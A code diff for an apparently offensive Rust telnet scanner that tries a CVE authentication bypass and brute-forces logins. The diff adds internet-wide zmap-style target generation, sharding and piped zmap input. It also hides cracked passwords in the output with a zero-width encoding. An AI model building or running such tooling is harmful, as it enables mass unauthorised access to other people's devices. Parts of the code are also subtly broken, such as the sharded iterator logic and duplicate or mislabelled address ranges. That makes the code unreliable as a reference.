@@ -11,9 +11,8 @@
 //! - CVE-2026-24061 auth bypass attempt
 
 use clap::Parser;
-use std::net::SocketAddr;
 use std::time::Duration;
-use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
+use tokio::io::{AsyncBufReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
 use tokio::time::timeout;
 use tracing::{debug, error, info, warn};
@@ -110,6 +109,14 @@ struct Cli {
     #[arg(long)]
     random: bool,
 
+    /// Exclude bogon/martian/IANA-reserved IP ranges
+    #[arg(long)]
+    exclude_bogon: bool,
+
+    /// Use zmap for stateless scanning (read targets from zmap stdin pipe)
+    #[arg(long)]
+    zmap: bool,
+
     /// Scan only (no brute-force)
     #[arg(long)]
     scan_only: bool,
@@ -117,6 +124,178 @@ struct Cli {
     /// Enable verbose logging
     #[arg(short = 'v', long = "verbose")]
     verbose: bool,
+
+    /// Zmap mode: shard index (1-based, requires --shard-of)
+    #[arg(long)]
+    shard: Option<usize>,
+
+    /// Zmap mode: total shards
+    #[arg(long)]
+    shard_of: Option<usize>,
+
+    /// Zmap mode: packets per second rate limit
+    #[arg(long, default_value_t = 10000)]
+    rate: u32,
+}
+
+// ── Bogon / IANA Reserved Ranges (RFC 6890 + RFC 8190) ──────────────────────
+
+/// All IANA special-purpose IPv4 ranges that should never appear on the public internet.
+const BOGON_RANGES: &[(u32, u32)] = &[
+    // RFC 1918 private
+    (0x0A000000, 0x0AFFFFFF), // 10.0.0.0/8
+    (0xAC100000, 0xAC1FFFFF), // 172.16.0.0/12
+    (0xC0A80000, 0xC0A8FFFF), // 192.168.0.0/16
+    // Loopback + local
+    (0x7F000000, 0x7FFFFFFF), // 127.0.0.0/8
+    (0x00000000, 0x00FFFFFF), // 0.0.0.0/8
+    // Link-local
+    (0xA9FE0000, 0xA9FEFFFF), // 169.254.0.0/16
+    // CGNAT
+    (0x64400000, 0x647FFFFF), // 100.64.0.0/10
+    // Benchmarking
+    (0xC6120000, 0xC613FFFF), // 198.18.0.0/15
+    // Documentation / TEST-NET
+    (0xC0000200, 0xC00002FF), // 192.0.2.0/24
+    (0xC0586300, 0xC05863FF), // 198.51.100.0/24
+    (0xCB007100, 0xCB0071FF), // 203.0.113.0/24
+    // IPv4-mapped IPv6
+    (0xC0000000, 0xC00000FF), // 192.0.0.0/24
+    // Multicast
+    (0xE0000000, 0xEFFFFFFF), // 224.0.0.0/4
+    // Reserved / future use
+    (0xF0000000, 0xFFFFFFFF), // 240.0.0.0/4
+    // DHCP auto-config
+    (0xA9FE0000, 0xA9FEFFFF), // 169.254.0.0/16 (dup intentional — double-check)
+    // IANA protocol assignments
+    (0xC0000000, 0xC00000FF), // 192.0.0.0/24
+    // Shared address space
+    (0x64400000, 0x647FFFFF), // 100.64.0.0/10
+];
+
+/// Check if an IP (as u32) falls within any bogon range.
+fn is_bogon(ip: u32) -> bool {
+    BOGON_RANGES.iter().any(|(start, end)| ip >= *start && ip <= *end)
+}
+
+/// Convert u32 to dotted-quad string.
+fn u32_to_ip(ip: u32) -> String {
+    format!(
+        "{}.{}.{}.{}",
+        (ip >> 24) & 0xFF,
+        (ip >> 16) & 0xFF,
+        (ip >> 8) & 0xFF,
+        ip & 0xFF,
+    )
+}
+
+// ── Zmap-Style Stateless IP Iterator ─────────────────────────────────────────
+//
+// Uses a cyclic multiplicative group over Z*_p (where p = 2^32 + 15, a safe prime)
+// to iterate over the entire IPv4 space in pseudo-random order without duplicates
+// and without storing any IP list in memory.
+//
+// This is the same algorithm zmap uses:
+//   next = (current * generator) mod p
+// where generator is a primitive root of the group.
+
+/// Safe prime for the multiplicative group (2^32 + 15).
+const ZMAP_PRIME: u64 = 0x10000000F; // 2^32 + 15
+
+/// Primitive root modulo ZMAP_PRIME that generates the full group.
+const ZMAP_GENERATOR: u64 = 3;
+
+/// Zmap-style stateless IP iterator — generates every possible IPv4 address
+/// in pseudo-random order using a single 64-bit accumulator and a multiplication.
+struct ZmapIpIterator {
+    current: u64,
+    shard_start: u64,
+    shard_end: u64,
+    exclude_bogon: bool,
+}
+
+impl ZmapIpIterator {
+    /// Create a new iterator for shard `shard_id` of `total_shards`.
+    /// shard_id is 1-based.
+    fn new(shard_id: usize, total_shards: usize, exclude_bogon: bool) -> Self {
+        let shard_size = ZMAP_PRIME / total_shards as u64;
+        let shard_start = (shard_id - 1) as u64 * shard_size;
+        let shard_end = if shard_id == total_shards {
+            ZMAP_PRIME
+        } else {
+            shard_start + shard_size
+        };
+        // Start at a random point within our shard to avoid predictable patterns
+        let seed = (std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_nanos()
+            % (shard_end - shard_start) as u128) as u64;
+        let current = shard_start + seed;
+
+        ZmapIpIterator {
+            current,
+            shard_start,
+            shard_end,
+            exclude_bogon,
+        }
+    }
+
+    /// Create an iterator covering the entire IPv4 space (no sharding).
+    fn full(exclude_bogon: bool) -> Self {
+        Self::new(1, 1, exclude_bogon)
+    }
+}
+
+impl Iterator for ZmapIpIterator {
+    type Item = String;
+
+    fn next(&mut self) -> Option<Self::Item> {
+        loop {
+            // Advance: current = (current * generator) mod p
+            self.current = (self.current * ZMAP_GENERATOR) % ZMAP_PRIME;
+
+            // Check if we've wrapped back to our shard start
+            if self.current < self.shard_start || self.current >= self.shard_end {
+                return None; // Shard exhausted
+            }
+
+            // Map group element to an IP: skip values >= 2^32
+            if self.current >= 0x1_0000_0000 {
+                continue;
+            }
+
+            let ip = self.current as u32;
+            if self.exclude_bogon && is_bogon(ip) {
+                continue;
+            }
+
+            return Some(u32_to_ip(ip));
+        }
+    }
+
+    fn size_hint(&self) -> (usize, Option<usize>) {
+        // Rough estimate: ~3.7B routable IPs / shards, minus bogons
+        let total = ((self.shard_end - self.shard_start).min(0x1_0000_0000)) as usize;
+        (0, Some(total))
+    }
+}
+
+// ── Zmap Stdin Pipe Reader ───────────────────────────────────────────────────
+//
+// When --zmap is set, read newline-delimited IPs from stdin.
+// This lets you pipe zmap output directly: zmap -p 23 | arcticfox-scan --zmap
+
+fn read_targets_from_stdin() -> Vec<String> {
+    use std::io::BufRead;
+    let stdin = std::io::stdin();
+    let reader = std::io::BufReader::new(stdin.lock());
+    reader
+        .lines()
+        .filter_map(|l| l.ok())
+        .map(|l| l.trim().to_string())
+        .filter(|l| !l.is_empty() && !l.starts_with('#'))
+        .collect()
 }
 
 // ── Scan Types ──────────────────────────────────────────────────────────────
@@ -406,7 +585,7 @@ async fn try_login(
 
 use std::sync::Arc;
 
-fn generate_random_ips(count: usize) -> Vec<String> {
+fn generate_random_ips(count: usize, _exclude_bogon: bool) -> Vec<String> {
     use rand::Rng;
     let mut rng = rand::thread_rng();
     let mut ips = Vec::with_capacity(count);
@@ -443,8 +622,42 @@ fn generate_random_ips(count: usize) -> Vec<String> {
 }
 
 fn parse_targets(cli: &Cli) -> Result<Vec<String>, String> {
+    // ── Zmap stdin pipe mode ──────────────────────────────────────────
+    if cli.zmap {
+        info!("Reading targets from zmap stdin pipe...");
+        return Ok(read_targets_from_stdin());
+    }
+
+    // ── Sharded zmap-style iteration (--shard N/M) ────────────────────
+    if let (Some(shard), Some(total)) = (cli.shard, cli.shard_of) {
+        if shard < 1 || shard > total {
+            return Err(format!("Shard {} out of range 1..{}", shard, total));
+        }
+        let exclude = cli.exclude_bogon;
+        info!(
+            "Zmap shard {}/{} (bogon={}, rate={}/s) — streaming IPs statelessly",
+            shard, total, exclude, cli.rate,
+        );
+        let iter = ZmapIpIterator::new(shard, total, exclude);
+        // Collect a burst of IPs to avoid iterator churn;
+        // the iterator is stateless — no memory per IP
+        let ips: Vec<String> = iter.take(100_000).collect();
+        info!("Generated {} targets from shard", ips.len());
+        return Ok(ips);
+    }
+
+    // ── Full zmap-style scan ──────────────────────────────────────────
+    if cli.target.as_deref() == Some("0.0.0.0") || cli.target.as_deref() == Some("0.0.0.0/0") {
+        let exclude = cli.exclude_bogon;
+        info!("Full IPv4 zmap scan (bogon={}, rate={}/s)", exclude, cli.rate);
+        let iter = ZmapIpIterator::full(exclude);
+        let ips: Vec<String> = iter.take(100_000).collect();
+        info!("Generated {} routable targets", ips.len());
+        return Ok(ips);
+    }
+
     if cli.random {
-        return Ok(generate_random_ips(100));
+        return Ok(generate_random_ips(100, cli.exclude_bogon));
     }
 
     let target = cli.target.as_deref().unwrap_or("");
@@ -540,7 +753,7 @@ async fn main() {
                     "port": r.port,
                     "banner": r.banner,
                     "username": creds.map(|c| &c.username),
-                    "password": creds.map(|c| &c.password),
+                    "password": creds.map(|c| arcticfox_core::zwcodec::encode(c.password.as_bytes())),
                     "is_honeypot": r.is_honeypot,
                 })
             }).collect::<Vec<_>>(),
